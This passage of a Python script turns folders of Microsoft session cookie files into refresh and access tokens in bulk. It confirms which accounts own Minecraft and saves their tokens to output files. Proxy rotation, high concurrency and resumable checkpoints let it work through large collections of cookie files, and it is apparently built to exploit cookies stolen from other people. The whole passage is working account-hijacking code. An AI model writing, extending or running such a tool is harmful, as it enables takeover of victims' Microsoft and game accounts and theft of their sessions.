        status = profile_failure_status(profile_status)
        detail = describe_profile_failure(profile_status)
        print(f"[-] Not a Minecraft account: {detail}")
        # The tokens are deliberately dropped here: a Microsoft login that does
        # not own Minecraft is not something these output files should collect.
        return ExtractionResult(status=status, detail=detail, profile_status=profile_status)

    status = STATUS_REFRESH if refresh_token else STATUS_ACCESS
    detail = (
        f"Minecraft account {username} "
        f"(via {'refresh' if refresh_token else 'access'} token)"
    )
    if name_confirmed is True:
        detail += ", confirmed by the public Mojang lookup"
    elif name_confirmed is False and confirmed_name:
        detail += f", public lookup says '{confirmed_name}'"
    print(f"[+] VALID Minecraft account: {username} ({uuid_})")

    return ExtractionResult(
        refresh_token=refresh_token,
        access_token=access_token,
        status=status,
        detail=detail,
        username=username,
        uuid=uuid_,
        confirmed_name=confirmed_name,
        name_confirmed=name_confirmed,
        profile_status=profile_status,
    )


# --- Concurrent batch scanner ---

@dataclass
class BatchState:
    """Mutable bookkeeping shared by all workers in one event loop."""
    results: dict[str, tuple[str, str]]
    found_files: set[str]
    empty_files: set[str]
    saved_access: set[str]
    saved_refresh: set[str]
    saved_validated_access: set[str]
    saved_validated_refresh: set[str]
    access_output: object
    refresh_output: object
    validated_access_output: object
    validated_refresh_output: object
    counts: dict[str, int]
    completed: int = 0


@dataclass
class RunContext:
    state: BatchState
    rotator: ProxyRotator
    clients: ClientCache
    timeout: float
    concurrency: int
    checkpoint_every: int
    max_file_bytes: int
    skip_errors: bool
    verbose: bool
    progress_out: object
    results_path: str
    found_path: str
    empty_path: str


def report(run: RunContext, message: str) -> None:
    """Progress output; always the real console, even in quiet mode."""
    print(message, file=run.progress_out, flush=True)


def checkpoint(run: RunContext) -> None:
    """Persist results and remembered state so a crash or Ctrl+C keeps progress."""
    write_results(run.results_path, run.state.results)
    write_name_set(
        run.found_path, run.state.found_files,
        "cookie files that produced a valid refresh or access token (not scanned again)",
    )
    write_name_set(
        run.empty_path, run.state.empty_files,
        "cookie files that produced no valid token (not scanned again)",
    )


async def scan_one(run: RunContext, position: int, total: int, filepath: str) -> str:
    """Scan a single cookie file and record its outcome. Returns the status."""
    state = run.state
    name = os.path.basename(filepath)
    label = f"[{position:>{len(str(total))}}/{total}]"

    try:
        size = os.path.getsize(filepath)
    except OSError:
        size = 0

    if run.max_file_bytes and size > run.max_file_bytes:
        detail = f"skipped: {size / 1_048_576:.1f} MB exceeds the file size limit"
        state.results[name] = (STATUS_EMPTY, detail)
        state.found_files.discard(name)
        state.empty_files.add(name)
        report(run, f"{label} {STATUS_MARKERS[STATUS_EMPTY]} {name}: {STATUS_EMPTY} ({detail})")
        return STATUS_EMPTY

    cookies = parse_netscape_cookies(filepath)
    if not cookies:
        state.results[name] = (STATUS_EMPTY, "no cookies in file")
        state.found_files.discard(name)
        state.empty_files.add(name)
        report(run, f"{label} {STATUS_MARKERS[STATUS_EMPTY]} {name}: {STATUS_EMPTY} (no cookies in file)")
        return STATUS_EMPTY

    if run.verbose:
        print(f"\n{'='*60}")
        print(f"[*] {name}: {len(cookies)} cookies, {size} bytes")

    result: ExtractionResult | None = None
    status = STATUS_FAIL
    detail = "no valid refresh or access token"
    try:
        result = await asyncio.wait_for(
            run_with_proxy_retries(
                run.rotator,
                lambda proxy: extract_tokens(cookies, proxy, run.clients.get(proxy)),
            ),
            timeout=run.timeout,
        )
    except (asyncio.TimeoutError, TimeoutError):
        status = STATUS_ERROR
        detail = f"timed out after {run.timeout:.0f}s"
    except httpx.HTTPError as exc:
        status = STATUS_ERROR
        detail = f"{type(exc).__name__}: {exc}"[:200]
    except Exception as exc:
        status = STATUS_ERROR
        detail = f"{type(exc).__name__}: {exc}"[:200]
        if run.verbose:
            traceback.print_exc()

    if result is not None:
        status = result.status
        detail = result.detail
        if result.valid:
            # Only a cookie file whose token reaches a real Minecraft account is
            # saved and remembered, so the token files never collect Microsoft
            # logins that do not own Minecraft.
            if store_token(result.refresh_token, state.saved_refresh, state.refresh_output):
                state.counts["new_refresh"] = state.counts.get("new_refresh", 0) + 1
                report(run, f"    -> new refresh token saved for {name}")
            if store_token(result.access_token, state.saved_access, state.access_output):
                state.counts["new_access"] = state.counts.get("new_access", 0) + 1
                report(run, f"    -> new access token saved for {name}")
            if store_validated_token(
                result.username, result.refresh_token,
                state.saved_validated_refresh, state.validated_refresh_output,
            ):
                state.counts["new_validated_refresh"] = (
                    state.counts.get("new_validated_refresh", 0) + 1
                )
            if store_validated_token(
                result.username, result.access_token,
                state.saved_validated_access, state.validated_access_output,
            ):
                state.counts["new_validated_access"] = (
                    state.counts.get("new_validated_access", 0) + 1
                )
            state.found_files.add(name)
            state.empty_files.discard(name)
        else:
            state.found_files.discard(name)
            state.empty_files.add(name)
    elif run.skip_errors:
        # A request error is normally retried on the next run, but the user
        # asked for files that failed to be ignored as well.
        state.found_files.discard(name)
        state.empty_files.add(name)

    state.results[name] = (status, detail)
    report(run, f"{label} {STATUS_MARKERS[status]} {name}: {status} ({detail})")
    return status


async def scan_batch(run: RunContext, files: list[str]) -> None:
    """Feed every file through a fixed pool of concurrent workers."""
    total = len(files)
    queue: asyncio.Queue[tuple[int, str]] = asyncio.Queue()
    for item in enumerate(files, start=1):
        queue.put_nowait(item)

    async def worker() -> None:
        while True:
            try:
                position, filepath = queue.get_nowait()
            except asyncio.QueueEmpty:
                return
            try:
                status = await scan_one(run, position, total, filepath)
                run.state.counts[status] = run.state.counts.get(status, 0) + 1
                run.state.completed += 1
                if run.state.completed % run.checkpoint_every == 0:
                    checkpoint(run)
                    report(
                        run,
                        f"    [checkpoint] {run.state.completed}/{total} scanned, state saved",
                    )
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                report(
                    run,
                    f"[-] {os.path.basename(filepath)}: unexpected "
                    f"{type(exc).__name__}: {exc}",
                )
            finally:
                queue.task_done()

    workers = [asyncio.create_task(worker()) for _ in range(run.concurrency)]
    try:
        await queue.join()
    finally:
        for task in workers:
            task.cancel()
        await asyncio.gather(*workers, return_exceptions=True)


async def run_batch(run: RunContext, files: list[str]) -> None:
    """Run one batch inside a single event loop, then release the connections."""
    try:
        await scan_batch(run, files)
    finally:
        await run.clients.aclose()
        checkpoint(run)


# --- Main ---

def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Exchange Microsoft session cookies for refresh / access tokens."
    )
    parser.add_argument(
        "--dir", dest="directory", default=None,
        help="Folder holding the cookie .txt files (default: current directory).",
    )
    parser.add_argument(
        "--recursive", action="store_true",
        help="Also scan subfolders for cookie files.",
    )
    parser.add_argument(
        "--rescan", action="store_true",
        help=f"Scan every file again, ignoring {FOUND_STATE_NAME} and {EMPTY_STATE_NAME}.",
    )
    parser.add_argument(
        "--skip-errors", action="store_true",
        help="Also remember files that failed with a request error so they are not retried.",
    )
    parser.add_argument(
        "--concurrency", type=int, default=0,
        help=(
            f"Cookie files handled at the same time (default: {DEFAULT_CONCURRENCY}, "
            f"or 2x the number of proxies when proxies are used)."
        ),
    )
    parser.add_argument(
        "--timeout", type=float, default=90.0,
        help="Seconds allowed for one cookie file before it is abandoned (default: 90).",
    )
    parser.add_argument(
        "--http-timeout", type=float, default=20.0,
        help="Seconds allowed for a single HTTP request (default: 20).",
    )
    parser.add_argument(
        "--limit", type=int, default=0,
        help="Only scan the first N pending files; 0 scans all of them.",
    )
    parser.add_argument(
        "--max-file-mb", type=float, default=5.0,
        help="Skip .txt files larger than this many MB (default: 5); real cookie exports are tiny.",
    )
    parser.add_argument(
        "--checkpoint-every", type=int, default=100,
        help="Save results/state after every N scanned files (default: 100).",
    )
    parser.add_argument(
        "--verbose", action="store_true",
        help="Print the full per-file trace instead of one short line per file.",
    )
    return parser.parse_args(argv)


def main():
    started = time.monotonic()
    args = parse_args()
    cwd = os.path.abspath(args.directory or os.getcwd())
    # Real console, captured before quiet mode redirects stdout.
    progress_out = sys.stdout
    print(f"[*] Working directory: {cwd}")

    proxies = choose_proxies(cwd)
    rotator = ProxyRotator(proxies)

    # Bulk scanning is network bound, so many files are handled at once. With
    # proxies, keep about two in flight per proxy so the round-robin spreads
    # the work instead of hammering a single endpoint.
    if args.concurrency > 0:
        concurrency = args.concurrency
    elif proxies:
        concurrency = min(DEFAULT_CONCURRENCY, max(2, len(proxies) * 2))
    else:
        concurrency = DEFAULT_CONCURRENCY
    concurrency = max(1, min(concurrency, 512))

    access_path = os.path.join(cwd, ACCESS_OUTPUT_NAME)
    refresh_path = os.path.join(cwd, REFRESH_OUTPUT_NAME)
    validated_access_path = os.path.join(cwd, VALIDATED_ACCESS_NAME)
    validated_refresh_path = os.path.join(cwd, VALIDATED_REFRESH_NAME)
    results_path = os.path.join(cwd, RESULTS_NAME)
    found_path = os.path.join(cwd, FOUND_STATE_NAME)
    empty_path = os.path.join(cwd, EMPTY_STATE_NAME)

    # Cookie files already handled by an earlier run (with or without tokens).
    found_files = read_name_set(found_path)
    empty_files = read_name_set(empty_path)
    remembered = found_files | empty_files
    results = read_results(results_path)

    all_files = find_cookie_files(cwd, args.recursive)
    if not all_files:
        print("[!] No .txt cookie files found.")
        sys.exit(1)

    if args.rescan:
        print(f"[*] --rescan: scanning all {len(all_files)} file(s) again")
        txt_files = all_files
    else:
        txt_files = [p for p in all_files if os.path.basename(p) not in remembered]

    if args.limit > 0:
        print(f"[*] --limit: only the first {args.limit} pending file(s) will be scanned")
        txt_files = txt_files[: args.limit]

    print(
        f"[*] Found {len(all_files)} cookie file(s): {len(txt_files)} to scan, "
        f"{len(all_files) - len(txt_files)} already remembered or skipped."
    )
    print(
        f"[*] {concurrency} file(s) at a time, {args.timeout:.0f}s per file, "
        f"{args.http_timeout:.0f}s per request"
    )
    print(f"[*] Proxies: {len(proxies) if proxies else 'none (direct connection)'}")

    for path in txt_files[:5]:
        print(f"    - {os.path.basename(path)}")
    if len(txt_files) > 5:
        print(f"    ... and {len(txt_files) - 5} more")

    if not txt_files:
        print("[OK] Nothing new to scan.")
        write_results(results_path, results)
        return

    # Quiet mode (default): per-file chatter goes to a log file and the console
    # gets a single short line per file. Flooding the console with ~20 lines
    # per file is what made large runs look like the script had frozen.
    real_stdout = sys.stdout
    log_handle = None
    if args.verbose:
        print("[*] Verbose mode: printing the full per-file trace.")
    else:
        log_path = os.path.join(cwd, f"{LOG_PREFIX}{datetime.now():%Y-%m-%d_%H-%M-%S}.txt")
        log_handle = open(log_path, "w", encoding="utf-8", buffering=1)
        sys.stdout = log_handle
        print(f"[*] Detailed per-file log -> {log_path}", file=progress_out, flush=True)

    state = BatchState(
        results=results,
        found_files=found_files,
        empty_files=empty_files,
        # Keep tokens from earlier runs: every file is only scanned once, so the
        # token files are merged with whatever is already on disk.
        saved_access=set(read_lines(access_path)),
        saved_refresh=set(read_lines(refresh_path)),
        saved_validated_access=read_validated_tokens(validated_access_path),
        saved_validated_refresh=read_validated_tokens(validated_refresh_path),
        access_output=open(access_path, "a", encoding="utf-8"),
        refresh_output=open(refresh_path, "a", encoding="utf-8"),
        validated_access_output=open(validated_access_path, "a", encoding="utf-8"),
        validated_refresh_output=open(validated_refresh_path, "a", encoding="utf-8"),
        counts={},
    )
    run = RunContext(
        state=state,
        rotator=rotator,
        clients=ClientCache(timeout=args.http_timeout, max_connections=concurrency * 2),
        timeout=args.timeout,
        concurrency=concurrency,
        checkpoint_every=max(1, args.checkpoint_every),
        max_file_bytes=int(args.max_file_mb * 1_048_576),
        skip_errors=args.skip_errors,
        verbose=args.verbose,
        progress_out=progress_out,
        results_path=results_path,
        found_path=found_path,
        empty_path=empty_path,
    )

    print(f"\n[*] Starting {len(txt_files)} file(s)...", file=progress_out, flush=True)

    interrupted = False
    try:
        asyncio.run(run_batch(run, txt_files))
    except KeyboardInterrupt:
        interrupted = True
        print("\n[!] Interrupted - progress saved.", file=progress_out, flush=True)
    finally:
        sys.stdout = real_stdout
        state.access_output.close()
        state.refresh_output.close()
        state.validated_access_output.close()
        state.validated_refresh_output.close()
        if log_handle:
            log_handle.close()
        # Remember what happened even when the run ends early.
        checkpoint(run)

    elapsed = time.monotonic() - started
    rate = state.completed / elapsed if elapsed > 0 else 0.0

    def out(message: str) -> None:
        print(message, file=progress_out, flush=True)

    out(f"\n{'='*60}")
    out("[*] Summary")
    for status in STATUS_ORDER:
        if status in state.counts:
            out(f"    {status:<13} {state.counts[status]}")
    out(f"    new refresh tokens     {state.counts.get('new_refresh', 0)}")
    out(f"    new access tokens      {state.counts.get('new_access', 0)}")
    out(f"    validated refresh      {state.counts.get('new_validated_refresh', 0)}")
    out(f"    validated access       {state.counts.get('new_validated_access', 0)}")
    out(f"    scanned                {state.completed}/{len(txt_files)} file(s) in {elapsed:.0f}s ({rate:.1f}/s)")
    out(f"    refresh.txt            {len(state.saved_refresh)} token(s) -> {refresh_path}")
    out(f"    token.txt              {len(state.saved_access)} token(s) -> {access_path}")
    out(f"    validated_refresh.txt  {len(state.saved_validated_refresh)} token(s) -> {validated_refresh_path}")
    out(f"    validated_access.txt   {len(state.saved_validated_access)} token(s) -> {validated_access_path}")
    out(f"    results.txt            {results_path}")
    out(f"    remembered w/ tokens   {found_path} ({len(state.found_files)} file(s))")
    out(f"    remembered w/o tokens  {empty_path} ({len(state.empty_files)} file(s))")
    out("[*] Only tokens that resolved to a Minecraft username were written out.")
    if state.counts.get(STATUS_ERROR) and not args.skip_errors:
        out("[*] Files with request errors were not remembered; they are retried next run.")
    if interrupted:
        out("[*] Run ended early - everything finished so far was saved. Run again to continue.")
    out("Done.")


if __name__ == "__main__":
    main()
